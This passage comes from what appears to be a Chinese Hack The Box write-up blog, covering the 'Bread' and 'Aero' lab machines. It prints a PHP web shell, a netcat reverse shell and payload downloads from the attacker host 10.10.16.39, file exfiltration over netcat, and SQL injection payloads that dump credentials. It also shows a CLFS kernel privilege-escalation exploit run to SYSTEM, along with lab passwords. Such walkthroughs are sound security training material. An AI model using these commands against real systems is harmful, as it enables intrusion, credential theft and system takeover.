routeros">Cookie: <span class="hljs-attribute">PHPSESSID</span>=paul47200b180ccd6835d25d034eeb6e6390; <span class="hljs-attribute">token</span>=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122100009574.png" alt="image-20250122100009574"></p><p>php也可以上传，我们传shell</p><p><img src="/../imgs/image-20250122100144249.png" alt="image-20250122100144249"></p><p><img src="/../imgs/image-20250122100149192.png" alt="image-20250122100149192"></p><p>想办法绕过报错，有可能是因为windows检测恶意文件了</p><p><img src="/../imgs/image-20250122102511975.png" alt="image-20250122102511975"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span>(`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]`);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122102517095.png" alt="image-20250122102517095"></p><p>反弹shell即可</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">powrshell -<span class="hljs-keyword">c</span> iwr http://<span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>/nc64.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">o</span> <span class="hljs-keyword">c</span>:\programdata\nc.<span class="hljs-keyword">exe</span><br><br>curl+http://<span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>/nc64.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">o</span> nc.<span class="hljs-keyword">exe</span><br>nc.<span class="hljs-keyword">exe</span>+-<span class="hljs-keyword">e</span>+cmd+<span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>+<span class="hljs-number">9001</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122103120205.png" alt="image-20250122103120205"></p><h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">3306</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;bread&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;jUli901&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;bread&quot;</span>;<br></code></pre></td></tr></table></figure><p>做一下密码喷洒</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">juliette</span><br><span class="hljs-type">Administrator</span><br><span class="hljs-title">development</span><br><span class="hljs-title">www</span>-<span class="hljs-class"><span class="hljs-keyword">data</span></span><br><span class="hljs-title">sshd</span><br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">crackmapexec ssh <span class="hljs-number">10.10</span>.<span class="hljs-number">10.228</span> -u <span class="hljs-keyword">user</span> <span class="hljs-title">-p</span> <span class="hljs-string">&quot;jUli901&quot;</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.228</span> -u <span class="hljs-keyword">user</span> <span class="hljs-title">-p</span> <span class="hljs-string">&quot;jUli901&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122110003208.png" alt="image-20250122110003208"></p><p><img src="/../imgs/image-20250122111656177.png" alt="image-20250122111656177"></p><p>转发出来看看</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">socks5代理<br>./chisel server -<span class="hljs-keyword">p</span> <span class="hljs-number">6666</span> --<span class="hljs-built_in">reverse</span><br>chisel.<span class="hljs-keyword">exe</span> client <span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>:<span class="hljs-number">6666</span> R:socks<br>.\ci.<span class="hljs-keyword">exe</span> client <span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>:<span class="hljs-number">6666</span> R:socks<br>netstat -ano | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;1080&quot;</span> 看<span class="hljs-number">1080</span>端口情况<br><br>sudo <span class="hljs-keyword">vim</span> /etc/proxychains4.<span class="hljs-keyword">conf</span> <br>socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span><br><br>proxychains <span class="hljs-keyword">nmap</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.228</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">5040</span>,<span class="hljs-number">7680</span>,<span class="hljs-number">3306</span> -sS sV<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122112820839.png" alt="image-20250122112820839"></p><p><img src="/../imgs/image-20250122112811375.png" alt="image-20250122112811375"></p><p><img src="/../imgs/image-20250122113243303.png" alt="image-20250122113243303"></p><p>这里存在账号密码</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">jUli901./())!<br>jUli901<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122113451240.png" alt="image-20250122113451240"></p><p><img src="/../imgs/image-20250122113737875.png" alt="image-20250122113737875"></p><p>登ssh</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> juliette@<span class="hljs-number">10.10.10.228</span> <br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122114112877.png" alt="image-20250122114112877"></p><h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p><img src="/../imgs/image-20250122114127241.png" alt="image-20250122114127241"></p><p><img src="/../imgs/image-20250122114139751.png" alt="image-20250122114139751"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Migrate passwords <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> Microsoft Store Sticky Notes application <span class="hljs-built_in">to</span> our <span class="hljs-built_in">new</span> password manager<br></code></pre></td></tr></table></figure><p><a href="https://dingtoffee.medium.com/windows-sticky-notes-forensics-80ee31ab67ef">https://dingtoffee.medium.com/windows-sticky-notes-forensics-80ee31ab67ef</a></p><p><img src="/../imgs/image-20250122120003001.png" alt="image-20250122120003001"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState<br></code></pre></td></tr></table></figure><p>把plum.sqlite、plum.sqlite-shm和plum.sqlite-wal都拿到本地</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">cmd <span class="hljs-symbol">/c</span> <span class="hljs-string">&quot;c:<span class="hljs-char escape_">\p</span>rog</span><br><span class="hljs-string">ramdata<span class="hljs-char escape_">\n</span>c.exe 10.10.16.39 1234 &lt; plum.sqlite&quot;</span> <br><span class="hljs-comment">#windows</span><br><br>nc <span class="hljs-operator">-</span>lp <span class="hljs-number">1234</span> <span class="hljs-operator">&gt;</span> plum.sqlite  <br><span class="hljs-comment">#kali</span><br></code></pre></td></tr></table></figure><p>项目解析:<a href="https://github.com/dingtoffee/StickyParser">https://github.com/dingtoffee/StickyParser</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> stickyparser.<span class="hljs-keyword">py</span>  -r ./plum.sqlite  -d .<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122121930368.png" alt="image-20250122121930368"></p><p>有juliette的密码</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">reg query <span class="hljs-string">&quot;HKLM<span class="hljs-char escape_">\S</span>oftware<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows NT<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\w</span>inlogon&quot;</span><br></code></pre></td></tr></table></figure><p>存在AutoLogon的密码</p><p><img src="/../imgs/image-20250122143121369.png" alt="image-20250122143121369"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">QNxH2vi01X<br></code></pre></td></tr></table></figure><p>上面那个项目不咋地，我们自己查询下</p><p><img src="/../imgs/image-20250122144129050.png" alt="image-20250122144129050"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">\<span class="hljs-attribute">id</span>=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!<br>\<span class="hljs-attribute">id</span>=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g<br>ssh development@10.10.10.228<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122144254931.png" alt="image-20250122144254931"></p><h3 id="提权3"><a href="#提权3" class="headerlink" title="提权3"></a>提权3</h3><p><img src="/../imgs/image-20250122144437895.png" alt="image-20250122144437895"></p><p>拿下来看看</p><p><img src="/../imgs/image-20250122144600263.png" alt="image-20250122144600263"></p><p><img src="/../imgs/image-20250122144901702.png" alt="image-20250122144901702"></p><p>需要key，逆逆看</p><p><img src="/../imgs/image-20250122155837928.png" alt="image-20250122155837928"></p><p>看看靶机端口开放情况</p><p><img src="/../imgs/image-20250122155826449.png" alt="image-20250122155826449"></p><p>这样的话请求试试</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"> /c <span class="hljs-string">&#x27;curl 127.0.0.1:1234/index.php -d &quot;method=select&amp;username=administrator&amp;table=passwords&quot;&#x27;</span></span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122160147262.png" alt="image-20250122160147262"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">k19D193j</span>.&lt;<span class="hljs-number">19391</span>(<br></code></pre></td></tr></table></figure><p>然后把1234转发出来</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">kali:</span><br><span class="hljs-symbol">./chisel</span> server <span class="hljs-operator">-</span>p <span class="hljs-number">6666</span> <span class="hljs-operator">-</span>-reverse<br><span class="hljs-params">windows:</span><br><span class="hljs-symbol">./ci.exe</span> client <span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>:<span class="hljs-number">6666</span> R:<span class="hljs-number">8888</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1234</span><br><span class="hljs-comment">#R:8888意思是使得连接到服务器的 8888 端口的请求将被转发到客户端的 127.0.0.1:8888 端口</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122160932168.png" alt="image-20250122160932168"></p><p>成功，再把8888转发到本地1234，然后编辑hosts</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">./chisel client <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">6666</span> R:<span class="hljs-number">1234</span>:<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8888</span><br><br>sudo vim /etc/hosts<br><span class="hljs-number">127.0.0.1</span> passmanager.htb<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122161207214.png" alt="image-20250122161207214"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://passmanager.htb:1234/index.php -d <span class="hljs-string">&quot;method=select&amp;username=administrator&amp;table=passwords&quot;</span><br></code></pre></td></tr></table></figure><p>成功转发</p><p><img src="/../imgs/image-20250122161838169.png" alt="image-20250122161838169"></p><p>不对，也许可以尝试注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://passmanager.htb:1234/index.php -d <span class="hljs-string">&quot;method=select&amp;username=administrator&#x27;&amp;table=passwords&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122162040579.png" alt="image-20250122162040579"></p><p>很脆弱</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#&amp;table=passwords<br><br><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; union select 1#&amp;<span class="hljs-attribute">table</span>=passwords<br><br><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; union select database()#&amp;<span class="hljs-attribute">table</span>=passwords<br><span class="hljs-comment">#bread</span><br><br><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; union select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema = <span class="hljs-string">&#x27;bread&#x27;</span>#&amp;<span class="hljs-attribute">table</span>=passwords<br><span class="hljs-comment">#passwords</span><br><br><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; union select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_schema = <span class="hljs-string">&#x27;bread&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&quot;passwords&quot;</span> #&amp;<span class="hljs-attribute">table</span>=passwords<br><span class="hljs-comment">#id,account,password,aes_key</span><br><br><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; union select group_concat(id,<span class="hljs-string">&quot; &quot;</span>,account,<span class="hljs-string">&quot; &quot;</span>,password,<span class="hljs-string">&quot; &quot;</span>,aes_key) <span class="hljs-keyword">from</span> passwords #&amp;<span class="hljs-attribute">table</span>=passwords<br><span class="hljs-comment">#1 Administrator H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= k19D193j.&lt;19391(&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122162148511.png" alt="image-20250122162148511"></p><p>应该解aes</p><p><img src="/../imgs/image-20250122171002815.png" alt="image-20250122171002815"></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-number">0000000000000000000000000000000</span><br>p@ssw0rd!@#$9890./<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122171028056.png" alt="image-20250122171028056"></p><p>成功</p><p><img src="/../imgs/image-20250122171047195.png" alt="image-20250122171047195"></p><h3 id="扩展之逆向分析"><a href="#扩展之逆向分析" class="headerlink" title="扩展之逆向分析"></a>扩展之逆向分析</h3><p>我们对程序进行分析</p><p><img src="/../imgs/image-20250122182335079.png" alt="image-20250122182335079"></p><p>1601,判断临界点在哪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">count = <span class="hljs-number">0</span><br>countint = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    count += <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>)<br>    countint +=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">1601</span>:<br>        <span class="hljs-built_in">print</span>(count - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>))<br>        <span class="hljs-built_in">print</span>(countint)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">output</span><br><span class="hljs-string">1552</span><br><span class="hljs-string">17</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>那么再补一个49就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">str1 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()-_=+[]&#123;&#125;|;:&#x27;\&quot;,.&lt;&gt;?/~\\&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str1:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i) == <span class="hljs-number">49</span>:<br>        <span class="hljs-built_in">print</span>(i)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">output</span><br><span class="hljs-string">1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>所以最终就是</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">aaaaaaaaaaaaaaaaa1<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122182744918.png" alt="image-20250122182744918"></p><p>成功</p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Aero</title>
    <link href="/2025/01/18/HTB-Aero/"/>
    <url>/2025/01/18/HTB-Aero/</url>
    
    <content type="html"><![CDATA[<h2 id="Aero"><a href="#Aero" class="headerlink" title="Aero"></a>Aero</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">237</span><br><span class="hljs-attribute">sudo</span> masscan -p1-<span class="hljs-number">65535</span> <span class="hljs-number">10.10.11.237</span> --rate=<span class="hljs-number">1000</span> -e tun0 &gt; ports<br><span class="hljs-attribute">ports</span>=$(cat ports | awk -F <span class="hljs-string">&quot; &quot;</span> &#x27;&#123;print $<span class="hljs-number">4</span>&#125;&#x27; | awk -F <span class="hljs-string">&quot;/&quot;</span> &#x27;&#123;print $<span class="hljs-number">1</span>&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)<br><span class="hljs-attribute">nmap</span> -Pn -sV -sC -p$ports <span class="hljs-number">10.10.11.237</span><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.11.237</span> --script=vuln<br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.11.237</span> -sU --top-ports <span class="hljs-number">20</span> -Pn<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250117205029434.png" alt="image-20250117205029434"></p><h3 id="80服务渗透"><a href="#80服务渗透" class="headerlink" title="80服务渗透"></a>80服务渗透</h3><p><img src="/../imgs/image-20250117213545685.png" alt="image-20250117213545685"></p><p><img src="/../imgs/image-20250117213550616.png" alt="image-20250117213550616"></p><p><img src="/../imgs/image-20250117213619548.png" alt="image-20250117213619548"></p><p>大概率有时恶意软件</p><p>谷歌搜下有一个cve</p><p><a href="https://www.exploit-db.com/exploits/47975">https://www.exploit-db.com/exploits/47975</a></p><p>我虽然生成了，但是貌似没什么用，甚至介绍都没告诉我怎么用的</p><p>好吧，其实漏洞并不产生在此</p><p>是CVE-2023-38146（称为 ThemeBleed）漏洞</p><p>POC公开地址:<a href="https://github.com/exploits-forsale/themebleed/tree/main/SMBFilterDemo">https://github.com/exploits-forsale/themebleed/tree/main/SMBFilterDemo</a></p><p>py版本:<a href="https://github.com/Jnnshschl/CVE-2023-38146/tree/main">https://github.com/Jnnshschl/CVE-2023-38146/tree/main</a></p><p>介绍:<a href="https://socprime.com/blog/cve-2023-38146-detection-windows-themebleed-rce-bugposes-growing-risks-with-the-poc-exploit-release/">https://socprime.com/blog/cve-2023-38146-detection-windows-themebleed-rce-bugposes-growing-risks-with-the-poc-exploit-release/</a></p><p>首先我们下载项目，然后在win下生成恶意dll</p><p><img src="/../imgs/image-20250118170123123.png" alt="image-20250118170123123"></p><p>然后拿到kali去，</p><p><img src="/../imgs/image-20250118170153430.png" alt="image-20250118170153430"></p><p>运行项目，生成的theme主题文件上传web</p><p><img src="/../imgs/image-20250118170223560.png" alt="image-20250118170223560"></p><p>本地监听9001</p><p><img src="/../imgs/image-20250118170232089.png" alt="image-20250118170232089"></p><p>成功</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/../imgs/image-20250118170449047.png" alt="image-20250118170449047"></p><p>拿下pdf来看</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">[convert]<span class="hljs-symbol">::ToBase64String</span>((<span class="hljs-name">cat</span> CVE-2023-28252_Summary.pdf -Encoding byte)) <br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250118171438267.png" alt="image-20250118171438267"></p><p>我们看系统配置</p><p><img src="/../imgs/image-20250118172255188.png" alt="image-20250118172255188"></p><p>看下面的补丁</p><p><img src="/../imgs/image-20250118172308191.png" alt="image-20250118172308191"></p><p>然后上官网看这个漏洞的补丁编码</p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252</a></p><p><img src="/../imgs/image-20250118172331345.png" alt="image-20250118172331345"></p><p>确认没打补丁，寻找exp进攻</p><p>漏洞介绍</p><p><a href="https://github.com/fortra/CVE-2023-28252">https://github.com/fortra/CVE-2023-28252</a></p><p>利用exe</p><p><a href="https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252/blob/main/x64/Release/clfs_eop.exe">https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252/blob/main/x64/Release/clfs_eop.exe</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PS C:\programdata&gt; iwr http:<span class="hljs-comment">//10.10.16.39/clfs_eop.exe -o cff.exe</span><br>iwr http:<span class="hljs-comment">//10.10.16.39/clfs_eop.exe -o cff.exe</span><br>PS C:\programdata&gt; .\cff<span class="hljs-selector-class">.exe</span> whoami<br>.\cff<span class="hljs-selector-class">.exe</span> whoami<br><span class="hljs-selector-attr">[+]</span> Incorrect number of arguments ... using default value <span class="hljs-number">1208</span> and flag <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> w11 and w10<br><br><br>ARGUMENTS<br><span class="hljs-selector-attr">[+]</span> TOKEN OFFSET <span class="hljs-number">4</span>b8<br><span class="hljs-selector-attr">[+]</span> FLAG <span class="hljs-number">1</span><br><br><br>VIRTUAL ADDRESSES AND OFFSETS<br><span class="hljs-selector-attr">[+]</span> NtFsControlFile Address --&gt; <span class="hljs-number">00007</span>FFBD0DE4240<br><span class="hljs-selector-attr">[+]</span> pool NpAt VirtualAddress --&gt;FFFFD68AFEF56000<br><span class="hljs-selector-attr">[+]</span> MY EPROCESSS FFFF8D8C8E7C2140<br><span class="hljs-selector-attr">[+]</span> SYSTEM EPROCESSS FFFF8D8C8A8CF040<br><span class="hljs-selector-attr">[+]</span> _ETHREAD ADDRESS FFFF8D8C8E4D2080<br><span class="hljs-selector-attr">[+]</span> PREVIOUS MODE ADDRESS FFFF8D8C8E4D22B2<br><span class="hljs-selector-attr">[+]</span> Offset ClfsEarlierLsn --------------------------&gt; <span class="hljs-number">0000000000013220</span><br><span class="hljs-selector-attr">[+]</span> Offset ClfsMgmtDeregisterManagedClient --------------------------&gt; <span class="hljs-number">000000000002</span>BFB0<br><span class="hljs-selector-attr">[+]</span> Kernel ClfsEarlierLsn --------------------------&gt; FFFFF80201333220<br><span class="hljs-selector-attr">[+]</span> Kernel ClfsMgmtDeregisterManagedClient --------------------------&gt; FFFFF8020134BFB0<br><span class="hljs-selector-attr">[+]</span> Offset RtlClearBit --------------------------&gt; <span class="hljs-number">0000000000343010</span><br><span class="hljs-selector-attr">[+]</span> Offset PoFxProcessorNotification --------------------------&gt; <span class="hljs-number">00000000003</span>DBD00<br><span class="hljs-selector-attr">[+]</span> Offset SeSetAccessStateGenericMapping --------------------------&gt; <span class="hljs-number">00000000009</span>C87B0<br><span class="hljs-selector-attr">[+]</span> Kernel RtlClearBit --------------------------&gt; FFFFF80203B43010<br><span class="hljs-selector-attr">[+]</span> Kernel SeSetAccessStateGenericMapping --------------------------&gt; FFFFF802041C87B0<br><br><span class="hljs-selector-attr">[+]</span> Kernel PoFxProcessorNotification --------------------------&gt; FFFFF80203BDBD00<br><br><br>PATHS<br><span class="hljs-selector-attr">[+]</span> Folder Public Path = C:\Users\Public<br><span class="hljs-selector-attr">[+]</span> Base log file name path= LOG:C:\Users\Public\<span class="hljs-number">49</span><br><span class="hljs-selector-attr">[+]</span> Base file <span class="hljs-selector-tag">path</span> = C:\Users\Public\<span class="hljs-number">49</span><span class="hljs-selector-class">.blf</span><br><span class="hljs-selector-attr">[+]</span> Container file name <span class="hljs-selector-tag">path</span> = C:\Users\Public\<span class="hljs-selector-class">.p_49</span><br>Last kernel CLFS <span class="hljs-selector-tag">address</span> = FFFFD68AEFCAF000<br>numero de tags CLFS founded <span class="hljs-number">9</span><br><br>Last kernel CLFS <span class="hljs-selector-tag">address</span> = FFFFD68AF4125000<br>numero de tags CLFS founded <span class="hljs-number">1</span><br><br><span class="hljs-selector-attr">[+]</span> Log file handle: <span class="hljs-number">0000000000000104</span><br><span class="hljs-selector-attr">[+]</span> Pool CLFS kernel <span class="hljs-selector-tag">address</span>: FFFFD68AF4125000<br><br>number of pipes created =<span class="hljs-number">5000</span><br><br>number of pipes created =<span class="hljs-number">4000</span><br>TRIGGER START<br>System_token_value: FFFFD68AEBA41597<br>SYSTEM TOKEN CAPTURED<br>Closing Handle<br>ACTUAL USER=SYSTEM<br>nt authority\system<br>WE 